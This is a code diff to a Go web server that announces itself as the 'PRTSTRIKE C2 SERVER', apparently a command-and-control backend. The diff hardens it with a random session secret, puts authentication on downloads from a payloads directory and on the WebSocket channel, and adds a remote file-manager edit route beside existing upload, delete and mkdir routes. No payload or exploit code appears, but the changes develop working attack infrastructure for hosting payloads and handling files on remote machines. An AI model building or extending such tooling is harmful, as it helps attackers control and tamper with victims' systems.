@@ -1,9 +1,13 @@
 package main
 
 import (
+	cryptoRand "crypto/rand"
+	"encoding/hex"
 	"fmt"
 	"log"
 	"net/http"
+	"os"
+	"strings"
 
 	"github.com/gin-contrib/sessions"
 	"github.com/gin-contrib/sessions/cookie"
@@ -15,7 +19,16 @@ func main() {
 
 	r := gin.Default()
 
-	store := cookie.NewStore([]byte("PRTS-SECRET-KEY-2026"))
+	// Session secret: prefer env var, otherwise generate random key each startup
+	secretKey := os.Getenv("PRTS_SECRET")
+	if secretKey == "" {
+		b := make([]byte, 32)
+		if _, err := cryptoRand.Read(b); err != nil {
+			log.Fatal("Failed to generate session secret:", err)
+		}
+		secretKey = hex.EncodeToString(b)
+	}
+	store := cookie.NewStore([]byte(secretKey))
 	r.Use(sessions.Sessions("prts-session", store))
 
 	// Session Timeout Middleware
@@ -35,7 +48,20 @@ func main() {
 		c.Next()
 	})
 
-	r.Static("/static", "./static")
+	// Static files: protect /static/payloads/ behind auth, serve rest normally
+	r.GET("/static/*filepath", func(c *gin.Context) {
+		p := c.Param("filepath")
+		if strings.HasPrefix(p, "/payloads/") || p == "/payloads" {
+			// Require authentication for payload downloads
+			session := sessions.Default(c)
+			if auth := session.Get("authenticated"); auth != true {
+				c.JSON(http.StatusUnauthorized, APIResponse{Status: "error", Message: "UNAUTHORIZED"})
+				c.Abort()
+				return
+			}
+		}
+		c.File("./static" + p)
+	})
 
 	r.GET("/", func(c *gin.Context) {
 		session := sessions.Default(c)
@@ -116,6 +142,7 @@ func main() {
 				rfm.POST("/upload", handleRemoteFMUpload)
 				rfm.POST("/mkdir", handleRemoteFMMkdir)
 				rfm.POST("/delete", handleRemoteFMDelete)
+				rfm.POST("/edit", handleRemoteFMEdit)
 			}
 
 			// System routes
@@ -134,8 +161,8 @@ func main() {
 		}
 	}
 
-	// WebSocket
-	r.GET("/ws", handleWS)
+	// WebSocket (requires authentication)
+	r.GET("/ws", AuthRequired(), handleWS)
 
 	addr := ":8083"
 	fmt.Printf("[+] PRTSTRIKE C2 SERVER (GIN) STARTED ON %s\n", addr)
